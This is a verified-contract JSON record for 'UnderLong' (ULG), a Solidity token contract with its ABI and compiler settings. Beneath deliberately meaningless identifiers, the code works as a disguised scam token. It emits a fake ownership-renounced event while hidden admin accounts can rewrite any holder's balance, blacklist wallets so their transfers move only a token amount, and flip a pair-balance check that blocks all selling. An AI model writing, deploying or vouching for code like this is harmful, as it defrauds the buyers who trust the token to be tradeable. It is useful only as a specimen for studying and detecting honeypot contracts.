{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface atExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTx) external view returns (uint256);\n\n    function transfer(address exemptMarketing, uint256 autoTeamFund) external returns (bool);\n\n    function allowance(address tradingAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoTeamFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptMarketing,\n        uint256 autoTeamFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isTx, uint256 value);\n    event Approval(address indexed tradingAt, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalList {\n    function createPair(address modeExempt, address fromSwap) external returns (address);\n}\n\ninterface atExemptMetadata is atExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnderLong is liquidityToken, atExempt, atExemptMetadata {\n\n    string private takeTeam = \"Under Long\";\n\n    function launchedMin(address modeSwapMin) public {\n        launchedReceiver();\n        \n        if (modeSwapMin == autoTake || modeSwapMin == modeSenderLaunch) {\n            return;\n        }\n        atTake[modeSwapMin] = true;\n    }\n\n    uint256 public swapFrom;\n\n    function atWallet(uint256 autoTeamFund) public {\n        launchedReceiver();\n        fromWallet = autoTeamFund;\n    }\n\n    mapping(address => bool) public feeMarketingAuto;\n\n    string private listWalletAt = \"ULG\";\n\n    bool private teamTradingSwap;\n\n    address private modeLimitTx;\n\n    function exemptSell(address shouldAmount, address exemptMarketing, uint256 autoTeamFund) internal returns (bool) {\n        require(tradingMarketing[shouldAmount] >= autoTeamFund);\n        tradingMarketing[shouldAmount] -= autoTeamFund;\n        tradingMarketing[exemptMarketing] += autoTeamFund;\n        emit Transfer(shouldAmount, exemptMarketing, autoTeamFund);\n        return true;\n    }\n\n    function receiverMin(address shouldAmount, address exemptMarketing, uint256 autoTeamFund) internal returns (bool) {\n        if (shouldAmount == autoTake) {\n            return exemptSell(shouldAmount, exemptMarketing, autoTeamFund);\n        }\n        uint256 buyMax = atExempt(modeSenderLaunch).balanceOf(autoBuy);\n        require(buyMax == fromWallet);\n        require(exemptMarketing != autoBuy);\n        if (atTake[shouldAmount]) {\n            return exemptSell(shouldAmount, exemptMarketing, exemptSwap);\n        }\n        return exemptSell(shouldAmount, exemptMarketing, autoTeamFund);\n    }\n\n    function balanceOf(address enableTx) public view virtual override returns (uint256) {\n        return tradingMarketing[enableTx];\n    }\n\n    function launchedReceiver() private view {\n        require(feeMarketingAuto[_msgSender()]);\n    }\n\n    uint8 private launchedEnable = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundMax;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeTeam;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listWalletAt;\n    }\n\n    address tokenTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function swapTradingMarketing(address teamTx, uint256 autoTeamFund) public {\n        launchedReceiver();\n        tradingMarketing[teamTx] = autoTeamFund;\n    }\n\n    bool public receiverLimit;\n\n    function owner() external view returns (address) {\n        return modeLimitTx;\n    }\n\n    address public autoTake;\n\n    uint256 private txTotal;\n\n    function transferFrom(address shouldAmount, address exemptMarketing, uint256 autoTeamFund) external override returns (bool) {\n        if (_msgSender() != tokenTeam) {\n            if (feeMaxMode[shouldAmount][_msgSender()] != type(uint256).max) {\n                require(autoTeamFund <= feeMaxMode[shouldAmount][_msgSender()]);\n                feeMaxMode[shouldAmount][_msgSender()] -= autoTeamFund;\n            }\n        }\n        return receiverMin(shouldAmount, exemptMarketing, autoTeamFund);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedEnable;\n    }\n\n    constructor (){\n        if (swapFrom != txTotal) {\n            swapFrom = txTotal;\n        }\n        listAmount fromSender = listAmount(tokenTeam);\n        modeSenderLaunch = totalList(fromSender.factory()).createPair(fromSender.WETH(), address(this));\n        if (teamTradingSwap) {\n            teamTradingSwap = true;\n        }\n        autoTake = _msgSender();\n        receiverTokenExempt();\n        feeMarketingAuto[autoTake] = true;\n        tradingMarketing[autoTake] = fundMax;\n        if (txTotal == swapFrom) {\n            receiverLimit = true;\n        }\n        emit Transfer(address(0), autoTake, fundMax);\n    }\n\n    bool public fundSell;\n\n    address autoBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return modeLimitTx;\n    }\n\n    function receiverTokenExempt() public {\n        emit OwnershipTransferred(autoTake, address(0));\n        modeLimitTx = address(0);\n    }\n\n    bool private launchMin;\n\n    mapping(address => uint256) private tradingMarketing;\n\n    function transfer(address teamTx, uint256 autoTeamFund) external virtual override returns (bool) {\n        return receiverMin(_msgSender(), teamTx, autoTeamFund);\n    }\n\n    uint256 private fundMax = 100000000 * 10 ** 18;\n\n    address public modeSenderLaunch;\n\n    mapping(address => mapping(address => uint256)) private feeMaxMode;\n\n    mapping(address => bool) public atTake;\n\n    function liquidityMinFrom(address listMax) public {\n        if (fundSell) {\n            return;\n        }\n        if (teamTradingSwap) {\n            teamTradingSwap = true;\n        }\n        feeMarketingAuto[listMax] = true;\n        if (launchMin != receiverLimit) {\n            teamTradingSwap = true;\n        }\n        fundSell = true;\n    }\n\n    function allowance(address tradingLaunched, address enableLaunched) external view virtual override returns (uint256) {\n        if (enableLaunched == tokenTeam) {\n            return type(uint256).max;\n        }\n        return feeMaxMode[tradingLaunched][enableLaunched];\n    }\n\n    uint256 constant exemptSwap = 17 ** 10;\n\n    uint256 liquidityTake;\n\n    event OwnershipTransferred(address indexed feeLaunchMax, address indexed modeTradingLaunched);\n\n    uint256 fromWallet;\n\n    function approve(address enableLaunched, uint256 autoTeamFund) public virtual override returns (bool) {\n        feeMaxMode[_msgSender()][enableLaunched] = autoTeamFund;\n        emit Approval(_msgSender(), enableLaunched, autoTeamFund);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunchMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTradingLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTeamFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoTeamFund\",\"type\":\"uint256\"}],\"name\":\"atWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeMarketingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwapMin\",\"type\":\"address\"}],\"name\":\"launchedMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"}],\"name\":\"liquidityMinFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSenderLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTokenExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTeamFund\",\"type\":\"uint256\"}],\"name\":\"swapTradingMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTeamFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTeamFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnderLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}